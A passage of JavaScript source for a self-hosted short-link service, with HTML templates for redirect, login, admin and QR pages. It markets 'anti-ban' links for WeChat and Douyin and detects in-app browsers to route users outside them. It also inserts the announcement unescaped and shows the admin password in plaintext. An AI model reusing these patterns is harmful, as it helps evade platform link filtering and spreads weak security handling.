    body { margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #fff; display: flex; flex-direction: column; min-height: 100vh; overflow: hidden; }
  </style>
</head>
<body>
  <div id="app"></div>
  <script>
    var target = "${location}";
    var ua = navigator.userAgent.toLowerCase();
    var isWx = /micromessenger|wxwork/i.test(ua);
    var isQQ = /qq|tencent|qzone|mqqbrowser/i.test(ua);
    var isApple = /iphone|ipad|ipod|macintosh|mac os x/i.test(ua);
    var showMask = ${config && config.wx_qq_mask_enabled !== undefined ? config.wx_qq_mask_enabled : 1};
    
    if ((isWx || isQQ) && showMask === 1) {
      document.title = "安全访问提示";
      document.body.style.background = "#333";
      
      var iconHtml = isApple 
        ? '<svg viewBox="0 0 100 100" style="width:100%;height:100%;"><circle cx="50" cy="50" r="50" fill="#007AFF"/><circle cx="50" cy="50" r="42" fill="none" stroke="#ffffff" stroke-dasharray="2 6.5" stroke-width="4"/><polygon points="44,56 80,20 56,44" fill="#FF3B30"/><polygon points="44,56 20,80 56,44" fill="#FFFFFF"/><circle cx="50" cy="50" r="4" fill="#cccccc"/></svg>'
        : '<svg viewBox="0 0 24 24" fill="#10b981" style="width:100%;height:100%;"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>';
        
      var footerHtml = \`${footerHtml}\`;
      
      document.getElementById('app').innerHTML = \`
        <style>
          .center-container { position: absolute; top: 40%; left: 50%; transform: translate(-50%, -50%); display: flex; flex-direction: column; align-items: center; z-index: 9999; width: 100%; }
          .icon-box { width: 80px; height: 80px; background: white; border-radius: 50%; padding: 4px; box-sizing: border-box; box-shadow: 0 4px 12px rgba(0,0,0,0.3); margin-bottom: 25px; }
          .mask-text { color: white; text-align: center; font-size: 18px; line-height: 1.8; font-weight: bold; white-space: nowrap; }
          .mask-text span { color: #ffeb3b; font-size: 24px; vertical-align: middle; margin: 0 4px; }
          .path-anim { stroke-dasharray: 8, 8; animation: march 1s linear infinite; }
          @keyframes march { from { stroke-dashoffset: 16; } to { stroke-dashoffset: 0; } }
          .footer-beian { position: fixed; bottom: 20px; left: 0; width: 100%; display: flex; justify-content: center; gap: 20px; font-size: 13px; z-index: 10000; }
          .footer-beian a { color: #9ca3af; text-decoration: none; transition: color 0.2s; display: flex; align-items: center; }
          .footer-beian a:hover { color: #d1d5db; }
        </style>
        
        <div class="center-container">
          <div class="icon-box" id="browser-icon">
            \${iconHtml}
          </div>
          <div class="mask-text">
            点击右上角 <span>···</span> 选择浏览器打开
          </div>
        </div>

        <svg id="arrow-svg" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; pointer-events: none;">
          <defs>
            <marker id="arrow" viewBox="0 0 10 10" refX="5" refY="5" markerWidth="6" markerHeight="6" orient="auto">
              <path d="M 0 0 L 10 5 L 0 10 z" fill="white" />
            </marker>
          </defs>
          <path id="arrow-path" fill="none" stroke="white" stroke-width="3" class="path-anim" marker-end="url(#arrow)" />
        </svg>
        
        \${footerHtml}
      \`;
      
      function drawCurve() {
        var icon = document.getElementById('browser-icon');
        var path = document.getElementById('arrow-path');
        if(!icon || !path) return;
        var rect = icon.getBoundingClientRect();
        var startX = rect.right;
        var startY = rect.top + rect.height / 2;
        var endX = window.innerWidth - 25;
        var endY = 40;
        var cpX = endX;
        var cpY = startY;
        path.setAttribute('d', 'M ' + startX + ' ' + startY + ' Q ' + cpX + ' ' + cpY + ' ' + endX + ' ' + endY);
      }
      setTimeout(drawCurve, 50);
      window.addEventListener('resize', drawCurve);
    } else {
      window.location.replace(target);
    }
  <\/script>
</body>
</html>`;
  return htmlResponse(html);
}

function getFavicon() {
  return `<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%233b82f6' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'><path d='M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71'/><path d='M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71'/></svg>">`;
}

function getCommonCss() {
  return `body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background-color:#111827;color:#f3f4f6;display:flex;flex-direction:column;min-height:100vh}*{box-sizing:border-box}.container{max-width:850px;width:100%;margin:8vh auto 40px auto;padding:40px;background:#1f2937;border-radius:16px;box-shadow:0 20px 25px -5px rgba(0,0,0,0.5),0 10px 10px -5px rgba(0,0,0,0.3)}h2{text-align:center;margin-bottom:30px;color:#f9fafb;font-size:28px}.input-group{margin-bottom:24px}label{display:block;margin-bottom:10px;font-weight:500;font-size:15px;color:#d1d5db}input[type="text"],input[type="password"]{width:100%;padding:14px;border:1px solid #4b5563;border-radius:8px;font-size:16px;outline:none;transition:border .2s;color:#f3f4f6;background-color:#374151}input[type="text"]:focus,input[type="password"]:focus{border-color:#60a5fa}button{width:100%;padding:14px;background-color:#3b82f6;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;transition:background .2s}button:hover{background-color:#2563eb}.msg{padding:12px;margin-bottom:24px;border-radius:8px;display:none;text-align:center;font-size:15px}.msg.error{background:#7f1d1d;color:#fecaca;border:1px solid #991b1b;display:block}.msg.success{background:#064e3b;color:#a7f3d0;border:1px solid #065f46;display:block}@media (max-width:768px){.container{padding:20px;margin:4vh auto 20px auto;width:90%}h2{font-size:24px;margin-bottom:20px}}`;
}

function getInitHtml() {
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="robots" content="noindex, nofollow">${getFavicon()}<title>系统初始化</title><style>${getCommonCss()}</style></head><body><div class="container"><h2>短链接系统 - 首次部署初始化</h2><div id="msg" class="msg"></div><div class="input-group"><label>管理员 URL 路径 (例: /myadmin)</label><input type="text" id="adminPath" placeholder="/admin" value="/admin"></div><div class="input-group"><label>管理员账户</label><input type="text" id="username" placeholder="设置账号"></div><div class="input-group"><label>管理员密码</label><input type="password" id="password" placeholder="设置密码"></div><button onclick="initSys()">初始化系统</button></div><script>async function initSys(){const a=document.getElementById('adminPath').value;const u=document.getElementById('username').value;const p=document.getElementById('password').value;const m=document.getElementById('msg');if(!a||!u||!p){m.className='msg error';m.innerText='请填写完整信息';return;}const r=await fetch('/api/init',{method:'POST',body:JSON.stringify({adminPath:a,username:u,password:p})});if(r.ok){window.location.href=a.startsWith('/')?a:'/'+a;}else{m.className='msg error';m.innerText='初始化失败';}}</script></body></html>`;
}

function getLoginHtml(path) {
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="robots" content="noindex, nofollow">${getFavicon()}<title>管理员登录</title><style>${getCommonCss()}</style></head><body><div class="container" style="max-width:500px"><h2>后台登录</h2><div id="msg" class="msg" style="display:none"></div><div id="step1"><div class="input-group"><label>账户</label><input type="text" id="username"></div><div class="input-group"><label>密码</label><input type="password" id="password"></div><button onclick="loginStep1()">下一步</button></div><div id="step2" style="display:none"><div class="input-group"><label>动态验证码 (OTP)</label><input type="text" id="otpCode" placeholder="输入 6 位动态码" autocomplete="off" style="text-align:center;font-size:24px;letter-spacing:8px;font-weight:bold" oninput="if(this.value.length===6) loginStep2()"></div><button onclick="loginStep2()">验证并登录</button><div style="text-align:center;margin-top:20px"><a href="javascript:void(0)" onclick="location.reload()" style="color:#9ca3af;font-size:14px;text-decoration:none;transition:color 0.2s" onmouseover="this.style.color='#f3f4f6'" onmouseout="this.style.color='#9ca3af'">返回重新输入账密</a></div></div></div><script>let tmpU='';let tmpP='';async function loginStep1(){const u=document.getElementById('username').value;const p=document.getElementById('password').value;const m=document.getElementById('msg');if(!u||!p){m.style.display='';m.className='msg error';m.innerText='请输入账户和密码';return;}const r=await fetch('${path}/login',{method:'POST',body:JSON.stringify({username:u,password:p})});const d=await r.json();if(r.ok){if(d.status==='require_otp'){tmpU=u;tmpP=p;document.getElementById('step1').style.display='none';document.getElementById('step2').style.display='block';m.style.display='none';document.getElementById('otpCode').focus();}else{window.location.reload();}}else{m.style.display='';m.className='msg error';m.innerText=d.msg||'验证失败';}}async function loginStep2(){const o=document.getElementById('otpCode').value;const m=document.getElementById('msg');if(!o){m.style.display='';m.className='msg error';m.innerText='请输入动态验证码';return;}const r=await fetch('${path}/login',{method:'POST',body:JSON.stringify({username:tmpU,password:tmpP,otp:o})});const d=await r.json();if(r.ok){window.location.reload();}else{m.style.display='';m.className='msg error';m.innerText=d.msg||'验证失败';document.getElementById('otpCode').value='';document.getElementById('otpCode').focus();}}</script></body></html>`;
}

function getFrontLoginHtml() {
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>输入访问密码</title><style>${getCommonCss()}</style></head><body><div class="container" style="max-width:400px"><h2>访问限制</h2><div id="msg" class="msg"></div><div class="input-group"><input type="password" id="pwd" placeholder="请输入前台访问密码" onkeydown="if(event.key==='Enter')verifyPwd()"></div><button onclick="verifyPwd()">验证进入</button></div><script>async function verifyPwd(){const p=document.getElementById('pwd').value;const m=document.getElementById('msg');if(!p){m.style.display='block';m.className='msg error';m.innerText='请输入密码';return;}const r=await fetch('/api/front_login',{method:'POST',body:JSON.stringify({pwd:p})});if(r.ok){window.location.reload();}else{m.style.display='block';m.className='msg error';m.innerText='密码错误';}}</script></body></html>`;
}

function getFrontendHtml(config) {
  const showAnnounce = config && config.announce_enabled === 1;
  const ann = config && config.announcement ? config.announcement : '';
  let noticeHtml = '';
  if (showAnnounce && ann) {
    noticeHtml = `<div class="notice-box"><div class="notice-title">公告</div><div class="notice-content">${ann}</div></div>`;
  }
  const psbIcon = `<img src="https://beian.mps.gov.cn/web/assets/logo01.6189a29f.png" style="width:16px;height:16px;vertical-align:middle;margin-right:4px;margin-top:-2px;" alt="">`;
  const icp = config && config.icp_number ? `<a href="${escapeHtml(config.icp_link)}" target="_blank" style="display:flex;align-items:center;">${escapeHtml(config.icp_number)}</a>` : '';
  const psb = config && config.psb_number ? `<a href="${escapeHtml(config.psb_link)}" target="_blank" style="display:flex;align-items:center;">${psbIcon}${escapeHtml(config.psb_number)}</a>` : '';
  let footerHtml = '';
  if (icp || psb) {
    footerHtml = `<div class="footer-beian">${icp}${psb}</div>`;
  }

  return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>专业短链接生成器 - 免费在线短网址、防封防屏蔽工具</title><meta name="description" content="专业短链接生成器，提供免费在线短网址生成服务，支持永久有效、自定义后缀、批量转换、访问统计等功能。适用于微信、抖音、小红书、公众号等多平台推广，生成稳定防封短链接，操作简单无广告，助力营销推广、裂变引流，是高效实用的在线短链接工具。"><meta name="keywords" content="短链接生成器,短网址生成器,免费短链接,永久短网址,防封短链接,微信短链接生成,抖音短链接,小红书短链接,自定义短链接,在线短链接工具"><meta property="og:title" content="专业短链接生成器 - 免费在线短网址、防封防屏蔽工具"><meta property="og:description" content="专业短链接生成器，提供免费在线短网址生成服务，支持永久有效、自定义后缀、批量转换、访问统计等功能。适用于微信、抖音、小红书、公众号等多平台推广，生成稳定防封短链接，操作简单无广告，助力营销推广、裂变引流，是高效实用的在线短链接工具。">${getFavicon()}<style>${getCommonCss()}.container{min-height:450px}.flex-row{display:flex;gap:12px}.flex-row input{flex:1}.flex-row button{width:130px}.notice-box{margin-top:40px;border-top:1px solid #4b5563;padding-top:30px}.notice-title{text-align:center;font-weight:bold;font-size:20px;margin-bottom:20px;color:#f9fafb}.notice-content{color:#d1d5db;line-height:1.8;font-size:15px;word-wrap:break-word;overflow-wrap:break-word;background:#374151;padding:20px;border-radius:12px;border:1px solid #4b5563;min-height:120px}.notice-content a{color:#60a5fa;text-decoration:underline}.result-box{display:none;margin-top:24px;padding:24px;background:#064e3b;border:1px solid #065f46;border-radius:12px;text-align:center}@media (max-width:768px){.flex-row{flex-direction:column;gap:12px}.flex-row button{width:100%}}
  .footer-beian { margin-top: auto; padding: 20px 0; display: flex; justify-content: center; gap: 20px; font-size: 13px; text-align: center; border-top: 1px solid #374151; }
  .footer-beian a { color: #9ca3af; text-decoration: none; transition: color 0.2s; display: flex; align-items: center;}
  .footer-beian a:hover { color: #d1d5db; }
  </style></head><body><div class="container"><h2>短链接生成</h2><div id="msg" class="msg"></div><div class="input-group"><label>输入长网址</label><div class="flex-row"><input type="text" id="longUrl" placeholder="https://..."><button onclick="generate()" id="btnGen">生成</button></div></div><div class="input-group"><label>自定义短链接 (可选):</label><input type="text" id="customShort" placeholder="不填写则系统自动生成"></div><div id="resultBox" class="result-box"><div id="resultTitle" style="margin-bottom:12px;color:#34d399;font-weight:bold;font-size:16px;"></div><a id="resultLink" href="" target="_blank" style="display:inline-block;margin-bottom:18px;color:#60a5fa;font-size:18px;word-break:break-all;text-decoration:none;"></a><br><button onclick="copyLink()" style="width:auto;padding:12px 28px;background:#059669;border:1px solid #047857;">一键复制短链接</button><div id="frontQrBox" style="margin-top:20px;display:flex;flex-direction:column;align-items:center;gap:8px;"><img id="frontQrImg" src="" style="width:180px;height:180px;background:#fff;padding:10px;border-radius:8px;box-sizing:border-box;"><div style="font-size:14px;color:#a7f3d0;">扫码访问短链接</div></div></div>${noticeHtml}</div>${footerHtml}<script>function makeQrImg(text){function svg(t){const tables={1:[26,7,1,[]],2:[44,10,1,[6,18]],3:[70,15,1,[6,22]],4:[100,20,1,[6,26]],5:[134,26,1,[6,30]],6:[172,18,2,[6,34]],7:[196,20,2,[6,22,38]],8:[242,24,2,[6,24,42]],9:[292,30,2,[6,26,46]],10:[346,18,4,[6,28,50]]};const enc=new TextEncoder().encode(t);let v=1,cfg=null,dataCodewords=0;for(;v<=10;v++){cfg=tables[v];dataCodewords=cfg[0]-cfg[1]*cfg[2];let cc=v<10?8:16;if(4+cc+enc.length*8<=dataCodewords*8)break}if(v>10)throw new Error('QR内容过长');const totalCodewords=cfg[0],eccLen=cfg[1],numBlocks=cfg[2],aligns=cfg[3],size=17+4*v,ccBits=v<10?8:16;let bits=[];function add(val,len){for(let i=len-1;i>=0;i--)bits.push((val>>>i)&1)}add(4,4);add(enc.length,ccBits);for(const b of enc)add(b,8);let maxBits=dataCodewords*8;let term=Math.min(4,maxBits-bits.length);for(let i=0;i<term;i++)bits.push(0);while(bits.length%8)bits.push(0);let data=[];for(let i=0;i<bits.length;i+=8){let b=0;for(let j=0;j<8;j++)b=(b<<1)|bits[i+j];data.push(b)}for(let p=236;data.length<dataCodewords;p^=253)data.push(p);let exp=new Array(512),log=new Array(256),x=1;for(let i=0;i<255;i++){exp[i]=x;log[x]=i;x<<=1;if(x&256)x^=285}for(let i=255;i<512;i++)exp[i]=exp[i-255];const mul=(a,b)=>a&&b?exp[log[a]+log[b]]:0;let gen=new Array(eccLen).fill(0);gen[eccLen-1]=1;let root=1;for(let i=0;i<eccLen;i++){for(let j=0;j<eccLen;j++){gen[j]=mul(gen[j],root);if(j+1<eccLen)gen[j]^=gen[j+1]}root=mul(root,2)}function ecc(dat){let res=new Array(eccLen).fill(0);for(const b of dat){let factor=b^res.shift();res.push(0);for(let i=0;i<eccLen;i++)res[i]^=mul(gen[i],factor)}return res}let blocks=[],k=0,numShort=numBlocks-totalCodewords%numBlocks,shortLen=Math.floor(totalCodewords/numBlocks);for(let i=0;i<numBlocks;i++){let datLen=shortLen-eccLen+(i<numShort?0:1);let dat=data.slice(k,k+datLen);k+=datLen;blocks.push({dat,ec:ecc(dat)})}let code=[],maxDat=Math.max(...blocks.map(b=>b.dat.length));for(let i=0;i<maxDat;i++)for(const b of blocks)if(i<b.dat.length)code.push(b.dat[i]);for(let i=0;i<eccLen;i++)for(const b of blocks)code.push(b.ec[i]);let m=Array.from({length:size},()=>Array(size).fill(false)),f=Array.from({length:size},()=>Array(size).fill(false));function set(x,y,val,func=true){if(0<=x&&x<size&&0<=y&&y<size){m[y][x]=!!val;if(func)f[y][x]=true}}function finder(cx,cy){for(let dy=-4;dy<=4;dy++)for(let dx=-4;dx<=4;dx++){let d=Math.max(Math.abs(dx),Math.abs(dy));set(cx+dx,cy+dy,d!==2&&d!==4,true)}}finder(3,3);finder(size-4,3);finder(3,size-4);for(let i=0;i<size;i++){if(!f[6][i])set(i,6,i%2===0,true);if(!f[i][6])set(6,i,i%2===0,true)}function align(cx,cy){for(let dy=-2;dy<=2;dy++)for(let dx=-2;dx<=2;dx++)set(cx+dx,cy+dy,Math.max(Math.abs(dx),Math.abs(dy))!==1,true)}for(const y of aligns)for(const x of aligns)if(!((x===6&&y===6)||(x===size-7&&y===6)||(x===6&&y===size-7)))align(x,y);set(8,size-8,true,true);if(v>=7){function verBits(){let rem=v;for(let i=0;i<12;i++)rem=(rem<<1)^(((rem>>>11)&1)*7973);return(v<<12)|rem}let vb=verBits();for(let i=0;i<18;i++){let bit=((vb>>>i)&1)!==0,a=size-11+i%3,b=Math.floor(i/3);set(a,b,bit,true);set(b,a,bit,true)}}function fmtBits(){let data=(1<<3)|0,rem=data;for(let i=0;i<10;i++)rem=(rem<<1)^(((rem>>>9)&1)*1335);return((data<<10)|rem)^21522}let fb=fmtBits();for(let i=0;i<=5;i++)set(8,i,((fb>>>i)&1)!==0,true);set(8,7,((fb>>>6)&1)!==0,true);set(8,8,((fb>>>7)&1)!==0,true);set(7,8,((fb>>>8)&1)!==0,true);for(let i=9;i<15;i++)set(14-i,8,((fb>>>i)&1)!==0,true);for(let i=0;i<8;i++)set(size-1-i,8,((fb>>>i)&1)!==0,true);for(let i=8;i<15;i++)set(8,size-15+i,((fb>>>i)&1)!==0,true);let bitIndex=0;for(let right=size-1;right>=1;right-=2){if(right===6)right--;for(let vert=0;vert<size;vert++){let y=(((right+1)&2)===0)?size-1-vert:vert;for(let x=right;x>=right-1;x--){if(!f[y][x]){let bit=false;if(bitIndex<code.length*8)bit=((code[bitIndex>>>3]>>>(7-(bitIndex&7)))&1)!==0;bitIndex++;if((x+y)%2===0)bit=!bit;m[y][x]=bit}}}}let cell=4,dim=(size+8)*cell,path='';for(let y=0;y<size;y++){let x=0;while(x<size){while(x<size&&!m[y][x])x++;let x0=x;while(x<size&&m[y][x])x++;if(x>x0)path+='M'+((x0+4)*cell)+' '+((y+4)*cell)+'h'+((x-x0)*cell)+'v'+cell+'H'+((x0+4)*cell)+'z'}}return'<svg xmlns="http://www.w3.org/2000/svg" width="'+dim+'" height="'+dim+'" viewBox="0 0 '+dim+' '+dim+'"><rect width="100%" height="100%" fill="#fff"/><path d="'+path+'" fill="#000"/></svg>'}return'data:image/svg+xml;charset=utf-8,'+encodeURIComponent(svg(text))}async function generate(){const l=document.getElementById('longUrl').value.trim();const c=document.getElementById('customShort').value.trim();const m=document.getElementById('msg');const b=document.getElementById('btnGen');const rb=document.getElementById('resultBox');const rl=document.getElementById('resultLink');const rt=document.getElementById('resultTitle');if(!l){m.style.display='';m.className='msg error';m.innerText='请输入长网址';rb.style.display='none';return;}if(!l.startsWith('http://')&&!l.startsWith('https://')){m.style.display='';m.className='msg error';m.innerText='请补全链接的 http:// 或 https:// 前缀';rb.style.display='none';return;}b.disabled=true;b.innerText='提交中...';const r=await fetch('/api/generate',{method:'POST',body:JSON.stringify({longUrl:l,customShort:c})});if(r.ok){const data=await r.json();const fullUrl=window.location.protocol+'//'+window.location.host+'/'+data.short;m.style.display='none';rt.innerText=data.audit?'您的短链接已生成 (待管理员审核后生效)：':'生成成功！您的短链接已生效可直接访问：';rl.href=fullUrl;rl.innerText=fullUrl;document.getElementById('frontQrImg').src=makeQrImg(fullUrl);rb.style.display='block';document.getElementById('longUrl').value='';document.getElementById('customShort').value='';}else{const t=await r.text();m.style.display='';m.className='msg error';m.innerText=t;rb.style.display='none';}b.disabled=false;b.innerText='生成';}async function copyLink(){const txt=document.getElementById('resultLink').innerText;try{await navigator.clipboard.writeText(txt);alert('复制成功！');}catch(e){alert('复制失败，请手动选取复制');}}</script></body></html>`;
}


function getStoppedHtml(config) {
  const psbIcon = `<img src="https://beian.mps.gov.cn/web/assets/logo01.6189a29f.png" style="width:16px;height:16px;vertical-align:middle;margin-right:4px;margin-top:-2px;" alt="">`;
  const icp = config && config.icp_number ? `<a href="${escapeHtml(config.icp_link)}" target="_blank" style="display:flex;align-items:center;">${escapeHtml(config.icp_number)}</a>` : '';
  const psb = config && config.psb_number ? `<a href="${escapeHtml(config.psb_link)}" target="_blank" style="display:flex;align-items:center;">${psbIcon}${escapeHtml(config.psb_number)}</a>` : '';
  let footerHtml = '';
  if (icp || psb) footerHtml = `<div class="footer-beian">${icp}${psb}</div>`;
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="robots" content="noindex, nofollow">${getFavicon()}<title>访问暂停</title><style>${getCommonCss()}.container{max-width:520px;text-align:center;margin-top:15vh}.tip{font-size:17px;line-height:1.8;color:#d1d5db}.footer-beian{margin-top:auto;padding:20px 0;display:flex;justify-content:center;gap:20px;font-size:13px;text-align:center;border-top:1px solid #374151}.footer-beian a{color:#9ca3af;text-decoration:none;transition:color 0.2s;display:flex;align-items:center}.footer-beian a:hover{color:#d1d5db}</style></head><body><div class="container"><h2>访问已暂停</h2><div class="tip">当前短链接内容触发安全策略，已被平台暂停访问。<br>请整改目标网站内容，否则可能被永久限制访问。</div></div>${footerHtml}</body></html>`;
}

function getLocalAdminHtml(path, currentHost) {
  let html = getAdminHtml(path, currentHost);
  html = html.replace('<div class="form-group"><label>修改密码 (留空则不修改)</label><input type="password" id="cfgPass"></div>', '<div class="form-group"><label>管理员密码</label><input type="text" id="cfgPass"></div>');
  html = html.replace('<div class="logo">管理后台</div>', '<div class="logo">超级后台</div>');
  html = html.replace("document.getElementById('cfgUser').value=d.config.username;", "document.getElementById('cfgUser').value=d.config.username;document.getElementById('cfgPass').value=d.config.password||'';");
  html = html.replace('<div class="bottom-actions"><button class="btn-frontend" onclick="window.open(\'/\', \'_blank\')">返回前台</button>', '<div class="bottom-actions"><button id="globalAccessBtn" class="btn-frontend" onclick="toggleGlobalAccess()" style="background:#fee2e2;border-color:#ef4444;color:#991b1b">停止访问</button><button class="btn-frontend" onclick="window.open(\'/\', \'_blank\')">返回前台</button>');
  html = html.replace('renderTables();}', 'renderTables();updateGlobalAccessButton(d.globalAccessStopped===1||d.globalAccessStopped===true);}');
  html = html.replace('async function logout(){', 'function updateGlobalAccessButton(stopped){const b=document.getElementById(\'globalAccessBtn\');if(!b)return;b.dataset.stopped=stopped?\'1\':\'0\';b.innerText=stopped?\'允许访问\':\'停止访问\';b.style.background=stopped?\'#d1fae5\':\'#fee2e2\';b.style.borderColor=stopped?\'#059669\':\'#ef4444\';b.style.color=stopped?\'#065f46\':\'#991b1b\';}async function toggleGlobalAccess(){const b=document.getElementById(\'globalAccessBtn\');const stopped=b&&b.dataset.stopped===\'1\';const msg=stopped?\'确定要恢复所有短链接访问吗？\':\'确定要停止所有短链接访问吗？\';if(!confirm(msg))return;await fetch(API_BASE+\'/action\',{method:\'POST\',body:JSON.stringify({action:\'toggle_global_access\',payload:{stopped:!stopped}})});loadData();}async function logout(){');
  return html;
}

function getAdminHtml(path, currentHost) {
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="robots" content="noindex, nofollow">${getFavicon()}<title>后台管理</title><style>body{margin:0;font-family:sans-serif;display:flex;height:100vh;background:#f3f4f6;overflow:hidden}.sidebar{width:220px;background:#1f2937;color:#fff;display:flex;flex-direction:column}.logo{padding:20px;font-size:20px;font-weight:bold;border-bottom:1px solid #374151;text-align:center}.nav-item{padding:15px 20px;cursor:pointer;transition:background .2s}.nav-item:hover,.nav-item.active{background:#374151;border-left:4px solid #3b82f6}.content{flex:1;padding:30px;overflow-y:auto}.card{background:#fff;padding:25px;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,0.1);margin-bottom:20px}h3{margin-top:0;color:#111827;margin-bottom:20px}.form-group{margin-bottom:15px}.form-group label{display:block;margin-bottom:5px;font-size:14px;color:#374151}.form-group input,.form-group textarea{width:100%;max-width:400px;padding:10px;border:1px solid #d1d5db;border-radius:6px;outline:none}.form-group textarea{height:120px;resize:vertical;max-width:100%}button.btn{padding:10px 20px;background:#3b82f6;color:#fff;border:none;border-radius:6px;cursor:pointer}button.btn:hover{background:#2563eb}button.btn-danger{background:#ef4444}button.btn-danger:hover{background:#dc2626}button.btn-success{background:#10b981}button.btn-success:hover{background:#059669}table{width:100%;border-collapse:collapse;font-size:14px}th,td{padding:12px;text-align:left;border-bottom:1px solid #e5e7eb;word-break:break-all}th{background:#f9fafb;font-weight:600;color:#4b5563}.tab-pane{display:none}.tab-pane.active{display:block}.actions{display:flex;gap:8px;flex-wrap:wrap}.badge{padding:4px 8px;border-radius:4px;font-size:12px;font-weight:bold;background:#fef3c7;color:#d97706;white-space:nowrap}.editor-toolbar{display:flex;gap:5px;padding:8px;border:1px solid #d1d5db;border-bottom:none;border-radius:6px 6px 0 0;background:#f9fafb;flex-wrap:wrap;align-items:center}.editor-toolbar button,.editor-toolbar select{padding:4px 8px;cursor:pointer;border:1px solid #d1d5db;border-radius:4px;background:#fff;font-size:14px;height:28px;color:#374151}.editor-toolbar button:hover{background:#e5e7eb}.bottom-actions{display:flex;flex-direction:column;gap:12px;margin-top:auto;padding:20px}.btn-frontend{width:100%;padding:12px;background:#d1fae5;border:1px solid #059669;color:#065f46;border-radius:6px;cursor:pointer;font-weight:bold;transition:all .2s}.btn-frontend:hover{background:#a7f3d0}.logout-btn{width:100%;padding:12px;background:transparent;border:1px solid #ef4444;color:#ef4444;border-radius:6px;cursor:pointer;font-weight:bold;transition:all .2s}.logout-btn:hover{background:#ef4444;color:#fff}.table-responsive{width:100%;overflow-x:auto;-webkit-overflow-scrolling:touch}details{background:#fff;border:1px solid #d1d5db;border-radius:6px;margin-bottom:15px;max-width:500px}summary{background:#f9fafb;padding:15px;cursor:pointer;font-weight:bold;color:#374151;outline:none;border-radius:6px}details[open] summary{border-bottom:1px solid #d1d5db;border-radius:6px 6px 0 0}.details-content{padding:15px}@media (max-width:768px){body{flex-direction:column;height:auto;min-height:100vh;overflow:auto}.sidebar{width:100%;flex-direction:row;overflow-x:auto;padding:0;border-bottom:1px solid #374151;align-items:center;justify-content:flex-start}.sidebar::-webkit-scrollbar{display:none}.logo{display:none}.nav-item{padding:12px 15px;font-size:14px;border-left:none;border-bottom:2px solid transparent;white-space:nowrap}.nav-item.active{border-left:none;border-bottom:2px solid #3b82f6;background:transparent}.bottom-actions{margin-top:0;padding:0 15px;margin-left:auto;flex-direction:row;gap:8px;align-items:center}.btn-frontend,.logout-btn{width:auto;padding:6px 12px;font-size:12px;white-space:nowrap}.content{padding:15px;overflow:visible}.card{padding:15px}.editor-toolbar button,.editor-toolbar select{font-size:12px;padding:2px 4px;height:24px}.form-group input,.form-group textarea{max-width:100%}}</style></head><body><div class="sidebar"><div class="logo">管理后台</div><div class="nav-item" data-tab="basic" onclick="switchTab('basic')">基础设置</div><div class="nav-item" data-tab="manage" onclick="switchTab('manage')">链接管理</div><div class="nav-item" data-tab="audit" onclick="switchTab('audit')">审核中心</div><div class="nav-item" data-tab="announce" onclick="switchTab('announce')">公告管理</div><div class="nav-item" data-tab="beian" onclick="switchTab('beian')">备案管理</div><div class="bottom-actions"><button class="btn-frontend" onclick="window.open('/', '_blank')">返回前台</button><button class="logout-btn" onclick="logout()">退出登录</button></div></div><div class="content"><div id="tab-basic" class="tab-pane"><div class="card"><h3>基础信息设置</h3><div class="form-group"><label>后台路径</label><input type="text" id="cfgPath"></div><div class="form-group"><label>管理员账户</label><input type="text" id="cfgUser"></div><div class="form-group"><label>修改密码 (留空则不修改)</label><input type="password" id="cfgPass"></div><div class="form-group" style="display:flex;align-items:center;gap:8px;margin-top:20px;flex-wrap:wrap"><input type="checkbox" id="cfgAudit" style="width:auto"><label style="margin:0;font-weight:bold;color:#111827">开启短链接人工审核 (关闭则生成秒生效)</label></div><button class="btn" style="margin-top:15px;width:auto" onclick="saveBasicConfig()">保存基础信息</button><hr style="margin:24px 0;border:none;border-top:1px solid #d1d5db;"><h3 style="margin:top:0">自动清理设置</h3><div class="form-group" style="display:flex;align-items:center;gap:8px;margin-top:15px;flex-wrap:wrap"><input type="checkbox" id="cfgAutoClean" style="width:auto" onchange="document.getElementById('cleanDaysWrapper').style.display=this.checked?'inline-flex':'none'"><label style="margin:0;font-weight:bold;color:#111827">开启长时间未访问自动清理</label></div><div id="cleanDaysWrapper" style="display:none;align-items:center;gap:8px;margin-bottom:15px;background:#f9fafb;padding:10px;border-radius:6px;border:1px solid #e5e7eb;flex-wrap:wrap"><span style="font-size:14px;color:#374151">无跳转自动删除天数：</span><input type="number" id="cfgCleanDays" value="30" min="1" max="3650" style="width:80px;padding:6px;text-align:center;border:1px solid #d1d5db;border-radius:4px;outline:none"><span style="font-size:14px;color:#374151">天</span></div><div class="form-group" style="display:flex;align-items:center;gap:8px;margin-top:15px;flex-wrap:wrap"><input type="checkbox" id="cfgPendingAutoClean" style="width:auto" 